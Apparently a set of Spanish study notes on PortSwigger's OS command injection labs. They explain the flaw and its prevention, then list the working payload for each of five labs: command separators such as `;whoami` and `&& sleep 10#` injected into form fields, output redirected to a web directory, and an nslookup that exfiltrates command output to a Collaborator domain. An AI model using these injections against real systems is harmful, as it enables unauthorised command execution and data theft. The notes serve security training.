-----
### QUE ES?
La **OS Command Injection** es una vulnerabilidad donde un atacante consigue que la aplicación ejecute **comandos del sistema operativo** manipulando un input.  
Ocurre cuando la aplicación construye comandos del sistema (por ejemplo `ping`, `ls`, `cat`, etc.) usando datos del usuario sin validarlos correctamente.  
El input malicioso se concatena al comando original y el servidor lo ejecuta con los permisos de la aplicación.

Permite cosas como:
- Leer archivos del sistema (`/etc/passwd`, claves, configs)
- Ejecutar comandos arbitrarios
- Obtener una reverse shell
- Escalar a compromiso total del servidor

Se previene usando:
- No ejecutar comandos del sistema si no es necesario
- Usar APIs seguras en lugar de `system()`, `exec()`, etc.
- Validar y sanitizar estrictamente el input
- Usar listas blancas de valores permitidos
- Ejecutar el proceso con mínimos privilegios
#### PASOS:
- *BUSCAR FUNCIONALIDADES QUE EJECUTEN COMANDOS (ping, traceroute, conversores, etc.)*
- *BUSCAR SI CHECK STOCK EJECUTA COMANDOS*
- *COMPROBAR TODOS LOS INPUTS DE SUBMIT FEEDBACK*
- _PROBAR CARACTERES DE INYECCIÓN (`;`, `&&`, `|`, `||`, `$( )`, backticks)_
- _VER SI LA RESPUESTA CAMBIA O DEVUELVE SALIDA DEL SISTEMA_

### LAB1: OS COMMAND INJECTION, SIMPLE CASE
En este lab nos encontramos con un apartado *Check Stock* que podemos interceptar con *Burp* y probar:
`productId=1&storeId=1;whoami`
Vemos que nos ejecuta el comando y nos lo imprime por pantalla
### LAB2: BLIND OS COMMAND INJECTION WITH TIME DELAYS
En este lab nos encontramos con un apartado *Submit Feedback*, debemos probar en todos los imputs si son susceptibles a *ejecución de comandos*.
Finalmente vemos que en el *email* podemos meter un sleep → es una ejecución de comando a ciegas.
`csrf=xxxxxxxxxxxxxxx&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test` → esta url encodeada la parte del comando
### LAB3: BLIND OS COMMAND INJECTION WITH OUTPUT REDIRECTION
En este lab nos encontramos con un apartado *Submit Feedback*, debemos probar en todos los imputs si son susceptibles a *ejecución de comandos*.
Vemos que es susceptible el input de email a ejecución de comandos a ciegas.`csrf=xxxxxxxxxxxxxxx&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test`
Pero si queremos ver el output, como vemos en el *http history* que carga las imágenes desde un filename, podemos intentar almacenar en la ruta `/var/www/images` y apuntar a el fichero
`csrf=xxxxxxxxxxxxxxx&name=test&email=test%40test.com||whoami>/var/www/images/output.txt||&subject=ttestt&message=test`
Apuntamos al fichero que contiene el output:
`LAB-ID.web-security-academy.net/image?filename=output.txt`
### LAB4: BLIND OS COMMAND INJECTION WITH OUT-OF-BAND INTERACTION
En este lab nos encontramos con un apartado *Submit Feedback*, debemos probar en todos los imputs si son susceptibles a *ejecución de comandos*.
Vemos que es susceptible el input de email a ejecución de comandos a ciegas.`csrf=wjxIinbRbw4St6U6vouZyeb5jlkFdSHC&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test`
Para ver el output como aquí no carga imágenes como en el lab anterior y como el comando se ejecuta de forma asincrona, para verlo necesitamos out-of-band:
`csrf=xxxxxxxxxxxxxxx&name=test&email=test%40test.com||nslookup+x.BURP-COLLABORATOR.SUBDOMAIN||&subject=ttestt&message=test`
### LAB5: BLIND OS COMMAND INJECTION WITH OUT-OF-BAND DATA EXFILTRATION
En este lab nos encontramos con un apartado *Submit Feedback*, debemos probar en todos los imputs si son susceptibles a *ejecución de comandos*.
Vemos que es susceptible el input de email a ejecución de comandos a ciegas.`csrf=wjxIinbRbw4St6U6vouZyeb5jlkFdSHC&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test`
Para ver el output como aquí no carga imágenes como en el lab anterior y como el comando se ejecuta de forma asincrona, para verlo necesitamos out-of-band:
`csrf=xxxxxxxxxxxxxxx&name=test&email=test%40test.com||nslookup+whoami(commands).BURP-COLLABORATOR.SUBDOMAIN||&subject=ttestt&message=test`
Hacer *Poll now* para ver el output del comando